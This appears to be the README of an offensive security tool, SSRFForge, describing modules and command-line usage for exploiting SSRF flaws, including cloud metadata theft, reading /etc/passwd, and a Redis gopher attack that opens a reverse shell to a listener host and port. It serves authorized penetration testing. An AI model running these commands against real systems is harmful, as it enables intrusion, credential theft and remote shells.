# SSRFForge - Advanced SSRF Exploitation Framework

[![Python Version](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

SSRFForge is a high-performance, asynchronous security framework designed for the automated discovery and advanced exploitation of Server-Side Request Forgery (SSRF) vulnerabilities. It serves as a more powerful and modular alternative to legacy tools like `SSRFmap`.

## 🚀 Key Features

- ⚡ **Asynchronous Execution**: Powered by `aiohttp` for lightning-fast scanning and exploitation.
- 🔍 **Heuristic Discovery**: Automatically identifies SSRF-prone parameters and HTTP headers (e.g., `X-Forwarded-For`, `Host`).
- 🛡️ **Advanced Bypass Engine**: Automatic generation of sophisticated payloads including:
  - IP Encodings (Decimal, Hex, Octal).
  - IDN (Internationalized Domain Names) bypasses.
  - DNS Rebinding templates via `nip.io`.
- ☁️ **Cloud Metadata Suite**: Extensive support for modern cloud environments:
  - **AWS**: Full IMDSv1 and **IMDSv2** (token-based) support.
  - **Azure**, **GCP**, and **DigitalOcean** metadata endpoints.
- 🐚 **Remote Code Execution (RCE)**:
  - **Redis**: Exploitation via `gopher://` for reverse shells.
  - **FastCGI**: Targeted RCE via `gopher://` protocol.
- 📁 **Protocol Switching**: Automated testing for `file://`, `dict://`, `gopher://`, `ftp://`, etc.
- 📊 **Advanced Reporting**: Generate detailed security reports in **JSON** or **Markdown** formats.
- 🎨 **Modern CLI**: Intuitive interface with rich logging and progress feedback.

## 🛠️ Installation

Ensure you have Python 3.10+ installed.

```bash
# Clone the repository
git clone https://github.com/ismailtsdln/SSRFForge.git
cd SSRFForge

# Install dependencies
pip install -r requirements.txt
```

## 📖 Usage Guide

### Basic Discovery

Automatically find and flag suspicious parameters in a URL.

```bash
python main.py -u "http://target.com/api?path=http://internal.data"
```

### Targeted Cloud Exploitation

Run the cloud metadata module on identified parameters.

```bash
python main.py -u "http://target.com/view?url=SSRF" -m cloud
```

### Redis RCE via Gopher

Achieve a reverse shell by targeting a local Redis instance.

```bash
python main.py -u "http://target.com/fetch?uri=SSRF" -m redis -lhost 10.10.14.5 -lport 4444
```

### Burp Suite Integration

Parse a raw HTTP request file exported from Burp.

```bash
python main.py -r request.txt -m portscan -o md
```

## 🧩 Module Overview

| Module | Description |
| :--- | :--- |
| `cloud` | Tests for AWS (v1/v2), Azure, GCP, and DigitalOcean metadata. |
| `portscan` | Scans common internal ports on the target's network. |
| `fileread` | Attempts to read sensitive local files (e.g., `/etc/passwd`). |
| `redis` | Performs RCE via Redis cron job/SSH key injection using gopher. |
| `fastcgi` | Targets FastCGI instances for remote command execution. |
| `blind` | Facilitates out-of-band (OOB) testing for blind SSRF. |

## ⚠️ Disclaimer

This tool is strictly for **educational purposes** and **authorized security testing**. Unauthorized use against systems without prior written consent is illegal. The developer assumes no liability for any damage caused by this tool.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request or open an Issue.

---
Developed by **@ismailtsdln**
